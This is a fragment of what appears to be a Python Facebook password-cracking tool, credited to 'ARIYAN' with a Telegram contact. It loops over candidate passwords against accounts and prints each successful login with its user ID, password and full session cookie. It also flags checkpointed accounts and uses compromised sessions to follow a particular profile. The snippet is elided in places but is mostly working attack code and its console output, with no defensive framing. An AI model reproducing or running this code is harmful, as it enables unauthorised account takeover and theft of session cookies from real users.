...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/nil1002000', {
...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB          : ARIYAN + SaBiNa ❤️
...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mINFO        : Telegram @Ethicalhacker404
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \33[1;30m(ARIYAN-OK 💚)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(ARIYAN-CP 💔)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r %s[ ARIYAN-XD ] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
